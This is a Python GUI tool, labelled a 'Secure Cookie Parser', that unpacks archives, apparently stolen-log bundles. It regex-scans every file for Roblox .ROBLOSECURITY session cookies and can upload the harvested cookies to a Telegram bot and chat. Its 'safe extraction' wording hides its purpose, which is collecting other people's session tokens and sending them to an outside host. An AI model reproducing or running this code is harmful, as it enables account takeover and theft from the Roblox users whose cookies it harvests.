#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Secure Cookie Parser with Modern GUI
Safe archive extraction and cookie parsing tool
"""

import os
import sys
import re
import time
import tempfile
import shutil
import zipfile
import tarfile
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Tuple
import threading

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox, font
except ImportError:
    print("Tkinter is required. Install it with: sudo apt-get install python3-tk")
    sys.exit(1)

try:
    import requests
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

try:
    import rarfile
    RAR_AVAILABLE = True
except ImportError:
    RAR_AVAILABLE = False

try:
    import py7zr
    SEVENZ_AVAILABLE = True
except ImportError:
    SEVENZ_AVAILABLE = False


class SecurityConfig:
    """Security configuration for safe file handling"""
    
    DANGEROUS_EXTENSIONS = {
        '.exe', '.bat', '.cmd', '.sh', '.ps1', '.vbs', '.js', '.jar',
        '.msi', '.dll', '.so', '.dylib', '.app', '.scr', '.pif'
    }
    
    MAX_FILE_SIZE = None
    MAX_FILES = None
    SAFE_DIR_PERMISSIONS = 0o755


class SecureTempDirectory:
    """Context manager for secure temporary directory handling"""
    
    def __init__(self, prefix='secure_parser_'):
        self.temp_dir = None
        self.prefix = prefix
        
    def __enter__(self):
        self.temp_dir = tempfile.mkdtemp(prefix=self.prefix)
        try:
            os.chmod(self.temp_dir, SecurityConfig.SAFE_DIR_PERMISSIONS)
        except OSError:
            pass
        return self.temp_dir
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                for root, dirs, files in os.walk(self.temp_dir):
                    for d in dirs:
                        try:
                            os.chmod(os.path.join(root, d), 0o700)
                        except OSError:
                            pass
                    for f in files:
                        try:
                            os.chmod(os.path.join(root, f), 0o600)
                        except OSError:
                            pass
                shutil.rmtree(self.temp_dir, ignore_errors=True)
            except Exception:
                pass


class ArchiveHandler:
    """Safe archive extraction handler"""
    
    SUPPORTED_FORMATS = {
        '.zip': 'zip',
        '.tar': 'tar',
        '.gz': 'tar',
        '.bz2': 'tar',
        '.xz': 'tar',
        '.tgz': 'tar',
    }
    
    @staticmethod
    def is_safe_filename(filename: str) -> bool:
        if '..' in filename:
            return False
        if filename.startswith('/') or filename.startswith('\\'):
            return False
        if ':' in filename and os.name == 'nt':
            return False
        return True
    
    @staticmethod
    def is_safe_file(filepath: str) -> bool:
        try:
            if SecurityConfig.MAX_FILE_SIZE is not None:
                if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
                    return False
        except OSError:
            return False
        ext = Path(filepath).suffix.lower()
        if ext in SecurityConfig.DANGEROUS_EXTENSIONS:
            return False
        return True
    
    @classmethod
    def extract_archive(cls, archive_path: str, extract_to: str, password: Optional[str] = None, progress_callback=None) -> Tuple[bool, str]:
        try:
            path = Path(archive_path)
            ext = path.suffix.lower()
            
            if ext not in cls.SUPPORTED_FORMATS:
                return False, f"Unsupported format: {ext}"
            
            archive_type = cls.SUPPORTED_FORMATS[ext]
            file_count = 0
            
            if archive_type == 'zip':
                with zipfile.ZipFile(archive_path, 'r') as zf:
                    members = zf.namelist()
                    total = len(members)
                    for i, member in enumerate(members):
                        if not cls.is_safe_filename(member):
                            continue
                        try:
                            zf.extract(member, extract_to, pwd=password.encode() if password else None)
                            file_count += 1
                        except Exception:
                            continue
                        if progress_callback:
                            progress_callback(i + 1, total)
                            
            elif archive_type == 'tar':
                with tarfile.open(archive_path, 'r:*') as tf:
                    members = tf.getmembers()
                    total = len(members)
                    for i, member in enumerate(members):
                        if not cls.is_safe_filename(member.name):
                            continue
                        try:
                            tf.extract(member, extract_to)
                            file_count += 1
                        except Exception:
                            continue
                        if progress_callback:
                            progress_callback(i + 1, total)
                            
            elif ext == '.rar' and RAR_AVAILABLE:
                with rarfile.RarFile(archive_path, 'r') as rf:
                    members = rf.namelist()
                    total = len(members)
                    for i, member in enumerate(members):
                        if not cls.is_safe_filename(member):
                            continue
                        try:
                            rf.extract(member, extract_to, pwd=password)
                            file_count += 1
                        except Exception:
                            continue
                        if progress_callback:
                            progress_callback(i + 1, total)
                            
            elif ext == '.7z' and SEVENZ_AVAILABLE:
                with py7zr.SevenZipFile(archive_path, 'r') as szf:
                    szf.extractall(extract_to, password=password)
                    file_count = len(szf.getnames())
                    if progress_callback:
                        progress_callback(1, 1)
            
            return True, f"Successfully extracted {file_count} files"
            
        except zipfile.BadZipFile:
            return False, "Invalid or corrupted ZIP file"
        except Exception as e:
            error_msg = str(e).lower()
            if password and ("password" in error_msg or "encrypted" in error_msg):
                return False, "Incorrect password"
            return False, f"Extraction error: {str(e)}"


class CookieParser:
    """Cookie file parser with pattern matching"""
    
    COOKIE_PATTERN = re.compile(
        r'(_\|WARNING:-DO-NOT-SHARE-THIS\.\--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\._[^\s]*)'
    )
    
    def __init__(self):
        self.found_cookies = []
        self.files_processed = 0
        self.errors = []
        
    def parse_directory(self, directory: str, progress_callback=None) -> Tuple[List[str], int]:
        self.found_cookies = []
        self.files_processed = 0
        
        try:
            all_files = []
            for root, dirs, files in os.walk(directory):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    all_files.append(filepath)
            
            total = len(all_files)
            for i, filepath in enumerate(all_files):
                try:
                    if not ArchiveHandler.is_safe_file(filepath):
                        continue
                    if self._is_text_file(filepath):
                        self._parse_file(filepath)
                    self.files_processed += 1
                except Exception as e:
                    self.errors.append(f"Error reading {filepath}: {str(e)}")
                
                if progress_callback:
                    progress_callback(i + 1, total)
                    
        except Exception as e:
            self.errors.append(f"Directory walk error: {str(e)}")
            
        return self.found_cookies, self.files_processed
    
    def _is_text_file(self, filepath: str) -> bool:
        try:
            if SecurityConfig.MAX_FILE_SIZE is not None:
                if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
                    return False
            with open(filepath, 'rb') as f:
                chunk = f.read(1024)
                if b'\x00' in chunk:
                    return False
            return True
        except Exception:
            return False
    
    def _parse_file(self, filepath: str):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            matches = self.COOKIE_PATTERN.findall(content)
            self.found_cookies.extend(matches)
        except Exception:
            try:
                with open(filepath, 'r', encoding='latin-1', errors='ignore') as f:
                    content = f.read()
                matches = self.COOKIE_PATTERN.findall(content)
                self.found_cookies.extend(matches)
            except Exception:
                pass


class TelegramSender:
    """Telegram message sender"""
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
    
    def send_message(self, message: str, parse_mode: str = "HTML") -> bool:
        if not TELEGRAM_AVAILABLE:
            return False
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': parse_mode
            }
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
        except Exception:
            return False
    
    def send_file(self, file_path: str, caption: str = "") -> bool:
        if not TELEGRAM_AVAILABLE:
            return False
        try:
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
            return response.status_code == 200
        except Exception:
            return False


class ParserGUI:
    """Main GUI application with modern design"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Secure Cookie Parser")
        self.root.geometry("700x650")
        self.root.minsize(700, 650)
        
        # Colors
        self.bg_color = "#1a1a2e"
        self.card_bg = "#16213e"
        self.accent_color = "#0f3460"
        self.highlight_color = "#e94560"
        self.text_color = "#ffffff"
        self.text_muted = "#a0a0a0"
        self.success_color = "#4ecca3"
        self.progress_bg = "#0f3460"
        
        # Variables
        self.archive_path = tk.StringVar()
        self.has_password = tk.BooleanVar()
        self.password = tk.StringVar()
        self.bot_id = tk.StringVar()
        self.chat_id = tk.StringVar()
        self.status_var = tk.StringVar(value="Готов к работе")
        self.progress_var = tk.DoubleVar()
        self.current_cookies = []
        self.parse_time = 0.0
        self.results_ready = False
        
        self.setup_ui()
        self.apply_styles()
        
    def apply_styles(self):
        """Apply modern dark theme styles"""
        self.root.configure(bg=self.bg_color)
        
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TFrame', background=self.bg_color)
        style.configure('Card.TFrame', background=self.card_bg)
        
        style.configure('TLabel', 
                       background=self.bg_color, 
                       foreground=self.text_color,
                       font=('Segoe UI', 10))
        style.configure('Card.TLabel',
                       background=self.card_bg,
                       foreground=self.text_color,
                       font=('Segoe UI', 10))
        style.configure('Title.TLabel',
                       font=('Segoe UI', 24, 'bold'),
                       foreground=self.highlight_color,
                       background=self.bg_color)
        style.configure('Status.TLabel',
                       font=('Segoe UI', 9),
                       foreground=self.text_muted,
                       background=self.bg_color)
        
        style.configure('TButton',
                       font=('Segoe UI', 11, 'bold'),
                       padding=12,
                       borderwidth=0,
                       background=self.accent_color,
                       foreground=self.text_color)
        style.map('TButton',
                 background=[('active', self.highlight_color), ('pressed', '#c73e52')])
        
        style.configure('TEntry',
                       fieldbackground=self.card_bg,
                       foreground=self.text_color,
                       borderwidth=0,
                       padding=10,
                       insertcolor=self.text_color)
        style.configure('TCheckbutton',
                       background=self.bg_color,
                       foreground=self.text_color,
                       font=('Segoe UI', 10))
        style.map('TCheckbutton',
                 background=[('active', self.bg_color)])
        
        style.configure('TProgressbar',
                       background=self.highlight_color,
                       troughcolor=self.progress_bg,
                       borderwidth=0,
                       lightcolor=self.highlight_color,
                       darkcolor=self.highlight_color)
        
        self.button_style = {
            'bg': self.accent_color,
            'fg': self.text_color,
            'activebackground': self.highlight_color,
            'activeforeground': self.text_color,
            'font': ('Segoe UI', 11, 'bold'),
            'relief': 'flat',
            'padx': 20,
            'pady': 10,
            'cursor': 'hand2',
            'borderwidth': 0
        }
        
    def setup_ui(self):
        """Setup modern user interface"""
        main_canvas = tk.Canvas(self.root, bg=self.bg_color, highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.root, orient="vertical", command=main_canvas.yview)
        
        self.scrollable_frame = tk.Frame(main_canvas, bg=self.bg_color)
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: main_canvas.configure(scrollregion=main_canvas.bbox("all"))
        )
        
        main_canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        main_canvas.configure(yscrollcommand=scrollbar.set)
        
        main_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        main_canvas.bind_all("<MouseWheel>", lambda e: main_canvas.yview_scroll(int(-1*(e.delta/120)), "units"))
        
        content_frame = tk.Frame(self.scrollable_frame, bg=self.bg_color, padx=30, pady=30)
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title with icon
        title_frame = tk.Frame(content_frame, bg=self.bg_color)
        title_frame.pack(pady=(0, 30))
        
        title_label = tk.Label(title_frame, 
                              text="🔐 Secure Cookie Parser",
                              font=('Segoe UI', 24, 'bold'),
                              fg=self.highlight_color,
                              bg=self.bg_color)
        title_label.pack()
        
        subtitle_label = tk.Label(title_frame,
                                 text="Безопасный парсер cookie из архивов",
                                 font=('Segoe UI', 10),
                                 fg=self.text_muted,
                                 bg=self.bg_color)
        subtitle_label.pack(pady=(5, 0))
        
        # Upload Card
        upload_card = self.create_card(content_frame)
        upload_card.pack(fill=tk.X, pady=10)
        
        tk.Label(upload_card, text="📁 Загрузка архива",
                font=('Segoe UI', 14, 'bold'),
                fg=self.text_color, bg=self.card_bg).pack(pady=(15, 10))
        
        file_frame = tk.Frame(upload_card, bg=self.card_bg)
        file_frame.pack(fill=tk.X, padx=20, pady=5)
        
        self.file_entry = tk.Entry(file_frame,
                                   textvariable=self.archive_path,
                                   font=('Segoe UI', 10),
                                   fg=self.text_color,
                                   bg=self.bg_color,
                                   insertcolor=self.text_color,
                                   relief='flat',
                                   width=50)
        self.file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8)
        
        upload_btn = tk.Button(file_frame,
                              text="Загрузить",
                              command=self.select_file,
                              **self.button_style)
        upload_btn.pack(side=tk.LEFT, padx=(10, 0))
        
        # Password section
        password_frame = tk.Frame(upload_card, bg=self.card_bg)
        password_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.password_check = tk.Checkbutton(password_frame,
                                            text="🔒 Есть пароль?",
                                            variable=self.has_password,
                                            command=self.toggle_password_field,
                                            font=('Segoe UI', 10),
                                            fg=self.text_color,
                                            bg=self.card_bg,
                                            selectcolor=self.card_bg,
                                            activebackground=self.card_bg)
        self.password_check.pack(side=tk.LEFT)
        
        self.password_entry = tk.Entry(password_frame,
                                       textvariable=self.password,
                                       font=('Segoe UI', 10),
                                       fg=self.text_color,
                                       bg=self.bg_color,
                                       insertcolor=self.text_color,
                                       relief='flat',
                                       show="•",
                                       width=25)
        self.password_entry.pack(side=tk.LEFT, padx=(10, 0), ipady=5)
        self.password_entry.pack_forget()
        
        # Telegram Card
        telegram_card = self.create_card(content_frame)
        telegram_card.pack(fill=tk.X, pady=10)
        
        tk.Label(telegram_card, text="📤 Отправка в Telegram (опционально)",
                font=('Segoe UI', 14, 'bold'),
                fg=self.text_color, bg=self.card_bg).pack(pady=(15, 10))
        
        tg_frame = tk.Frame(telegram_card, bg=self.card_bg)
        tg_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(tg_frame, text="Bot ID:",
                font=('Segoe UI', 10),
                fg=self.text_muted, bg=self.card_bg).grid(row=0, column=0, sticky='w', pady=5)
        
        self.bot_entry = tk.Entry(tg_frame,
                                  textvariable=self.bot_id,
                                  font=('Segoe UI', 10),
                                  fg=self.text_color,
                                  bg=self.bg_color,
                                  insertcolor=self.text_color,
                                  relief='flat',
                                  width=35)
        self.bot_entry.grid(row=0, column=1, padx=(10, 0), pady=5, ipady=5)
        
        tk.Label(tg_frame, text="Chat ID:",
                font=('Segoe UI', 10),
                fg=self.text_muted, bg=self.card_bg).grid(row=1, column=0, sticky='w', pady=5)
        
        self.chat_entry = tk.Entry(tg_frame,
                                   textvariable=self.chat_id,
                                   font=('Segoe UI', 10),
                                   fg=self.text_color,
                                   bg=self.bg_color,
                                   insertcolor=self.text_color,
                                   relief='flat',
                                   width=35)
        self.chat_entry.grid(row=1, column=1, padx=(10, 0), pady=5, ipady=5)
        
        # Progress Card
        progress_card = self.create_card(content_frame)
        progress_card.pack(fill=tk.X, pady=10)
        
        tk.Label(progress_card, text="⏳ Прогресс",
                font=('Segoe UI', 14, 'bold'),
                fg=self.text_color, bg=self.card_bg).pack(pady=(15, 10))
        
        self.progress_bar = ttk.Progressbar(progress_card,
                                            variable=self.progress_var,
                                            maximum=100,
                                            mode='determinate',
                                            length=500)
        self.progress_bar.pack(padx=20, pady=10, fill=tk.X)
        
        self.status_label = tk.Label(progress_card,
                                     textvariable=self.status_var,
                                     font=('Segoe UI', 10),
                                     fg=self.text_muted,
                                     bg=self.card_bg)
        self.status_label.pack(pady=(0, 15))
        
        # Action buttons
        action_frame = tk.Frame(content_frame, bg=self.bg_color)
        action_frame.pack(pady=20)
        
        self.start_btn = tk.Button(action_frame,
                                   text="▶ Начать парсинг",
                                   command=self.start_parsing,
                                   **self.button_style)
        self.start_btn.pack(side=tk.LEFT, padx=10)
        
        self.export_btn = tk.Button(action_frame,
                                    text="💾 Экспорт результатов",
                                    command=self.export_results,
                                    state=tk.DISABLED,
                                    **self.button_style)
        self.export_btn.pack(side=tk.LEFT, padx=10)
        
        # Results Card (hidden initially)
        self.results_card = self.create_card(content_frame)
        
        tk.Label(self.results_card, text="✅ Результаты",
                font=('Segoe UI', 14, 'bold'),
                fg=self.success_color, bg=self.card_bg).pack(pady=(15, 10))
        
        self.results_text = tk.Text(self.results_card,
                                    font=('Consolas', 10),
                                    fg=self.text_color,
                                    bg=self.bg_color,
                                    wrap=tk.WORD,
                                    relief='flat',
                                    padx=15,
                                    pady=15,
                                    height=8)
        self.results_text.pack(fill=tk.X, padx=20, pady=10)
        
        # Footer
        footer_frame = tk.Frame(content_frame, bg=self.bg_color)
        footer_frame.pack(pady=(30, 10))
        
        footer_label = tk.Label(footer_frame,
                               text="Все файлы обрабатываются в защищенной среде",
                               font=('Segoe UI', 9),
                               fg=self.text_muted,
                               bg=self.bg_color)
        footer_label.pack()
        
    def create_card(self, parent):
        """Create a styled card container"""
        card = tk.Frame(parent,
                       bg=self.card_bg,
                       relief='flat',
                       padx=20,
                       pady=15)
        return card
    
    def toggle_password_field(self):
        """Show/hide password field"""
        if self.has_password.get():
            self.password_entry.pack(side=tk.LEFT, padx=(10, 0), ipady=5)
        else:
            self.password_entry.pack_forget()
            self.password.set("")
    
    def select_file(self):
        """Open file dialog to select archive"""
        filetypes = [
            ("Archive files", "*.zip *.tar *.gz *.bz2 *.xz *.tgz"),
            ("RAR files", "*.rar"),
            ("7z files", "*.7z"),
            ("All files", "*.*")
        ]
        filename = filedialog.askopenfilename(
            title="Выберите архив",
            filetypes=filetypes
        )
        if filename:
            self.archive_path.set(filename)
    
    def update_progress(self, current, total):
        """Update progress bar"""
        if total > 0:
            percentage = (current / total) * 100
            self.progress_var.set(percentage)
            self.root.update_idletasks()
    
    def set_status(self, status):
        """Update status label"""
        self.status_var.set(status)
        self.root.update_idletasks()
    
    def start_parsing(self):
        """Start the parsing process"""
        if not self.archive_path.get():
            messagebox.showwarning("Внимание", "Пожалуйста, выберите архив!")
            return
        
        archive_file = self.archive_path.get()
        if not os.path.exists(archive_file):
            messagebox.showerror("Ошибка", "Файл не найден!")
            return
        
        self.start_btn.config(state=tk.DISABLED)
        self.export_btn.config(state=tk.DISABLED)
        self.progress_var.set(0)
        self.results_ready = False
        
        thread = threading.Thread(target=self.parsing_thread, args=(archive_file,))
        thread.daemon = True
        thread.start()
    
    def parsing_thread(self, archive_file):
        """Background thread for parsing"""
        try:
            self.set_status("Извлечение архива...")
            
            with SecureTempDirectory() as temp_dir:
                password = self.password.get() if self.has_password.get() else None
                
                def extract_progress(current, total):
                    self.set_status(f"Извлечение: {current}/{total}")
                    self.progress_var.set((current / total) * 50)
                
                success, message = ArchiveHandler.extract_archive(
                    archive_file, temp_dir, password, extract_progress
                )
                
                if not success:
                    self.root.after(0, lambda: messagebox.showerror("Ошибка", message))
                    self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
                    self.set_status("Ошибка извлечения")
                    return
                
                self.set_status("Поиск cookie...")
                
                parser = CookieParser()
                
                def parse_progress(current, total):
                    self.set_status(f"Анализ файлов: {current}/{total}")
                    self.progress_var.set(50 + (current / total) * 50)
                
                start_time = time.time()
                cookies, files_count = parser.parse_directory(temp_dir, parse_progress)
                end_time = time.time()
                
                self.parse_time = end_time - start_time
                self.current_cookies = cookies
                
                result_message = f"┌{'─' * 50}┐\n"
                result_message += f"│ Всего cookie: {len(cookies)}\n"
                result_message += f"│ Время проверки: {self.parse_time:.3f} sec\n"
                result_message += f"│ Обработано файлов: {files_count}\n"
                result_message += f"└{'─' * 50}┘"
                
                bot_token = self.bot_id.get().strip()
                chat_id = self.chat_id.get().strip()
                
                if bot_token and chat_id:
                    self.set_status("Отправка в Telegram...")
                    tg_sender = TelegramSender(bot_token, chat_id)
                    
                    temp_cookie_file = os.path.join(temp_dir, "cookies.txt")
                    with open(temp_cookie_file, 'w', encoding='utf-8') as f:
                        for cookie in cookies:
                            f.write(cookie + '\n')
                    
                    stats_msg = f"<b>Результаты парсинга</b>\n\n"
                    stats_msg += f"🍪 <b>Всего cookie:</b> {len(cookies)}\n"
                    stats_msg += f"⏱️ <b>Время проверки:</b> {self.parse_time:.3f} sec\n"
                    stats_msg += f"📁 <b>Обработано файлов:</b> {files_count}"
                    
                    tg_sender.send_message(stats_msg)
                    
                    if cookies:
                        tg_sender.send_file(temp_cookie_file, "Cookie файл")
                
                self.root.after(0, self.show_results, result_message)
                self.set_status("Готово!")
                
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Ошибка", str(e)))
            self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
            self.set_status("Произошла ошибка")
    
    def show_results(self, message):
        """Display results"""
        self.results_card.pack(fill=tk.X, pady=10)
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, message)
        
        self.progress_var.set(100)
        self.export_btn.config(state=tk.NORMAL)
        self.start_btn.config(state=tk.NORMAL)
        self.results_ready = True
    
    def export_results(self):
        """Export results to file"""
        if not self.current_cookies:
            messagebox.showinfo("Информация", "Нет cookie для экспорта!")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_filename = f"cookies_{timestamp}.txt"
        
        filename = filedialog.asksaveasfilename(
            title="Сохранить результаты",
            defaultextension=".txt",
            initialfile=default_filename,
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"# Cookie Export - {datetime.now().isoformat()}\n")
                    f.write(f"# Всего cookie: {len(self.current_cookies)}\n")
                    f.write(f"# Время проверки: {self.parse_time:.3f} sec\n\n")
                    for cookie in self.current_cookies:
                        f.write(cookie + '\n')
                
                messagebox.showinfo("Успех", f"Результаты сохранены в:\n{filename}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл:\n{str(e)}")
    
    def run(self):
        """Run the application"""
        self.root.mainloop()


def main():
    app = ParserGUI()
    app.run()


if __name__ == "__main__":
    main()
